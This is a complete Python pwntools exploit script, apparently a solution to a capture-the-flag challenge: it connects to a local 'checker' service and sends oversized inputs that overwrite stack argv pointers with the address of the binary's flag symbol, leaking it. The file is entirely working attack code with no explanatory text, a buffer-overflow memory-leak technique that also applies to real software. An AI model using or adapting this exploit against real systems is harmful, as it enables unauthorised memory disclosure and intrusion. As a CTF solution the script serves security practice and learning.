#! /usr/bin/env python
from pwn import *

rhp = {'host':"localhost", 'port':14726}
context(os = 'linux', arch = 'amd64')
binf = ELF('./checker')
addr_flag = binf.symbols['flag']

#=========

def attack(conn):
        conn.recvuntil('NAME : ')
        conn.sendline('name')

        # set argv
        for i in range(7, 3, -1):
                conn.recvuntil('>> ')
                conn.sendline('a' * (0x178+i))
        conn.recvuntil('>> ')
        conn.sendline('a' * 0x178 + p64(addr_flag))

        conn.recvuntil('>> ')
        conn.sendline('yes')

        conn.recvuntil('FLAG : ')
        conn.sendline('flag')

        print conn.read()

#=========

if __name__=='__main__':
        conn = remote(rhp['host'], rhp['port'])
        attack(conn)

#=========


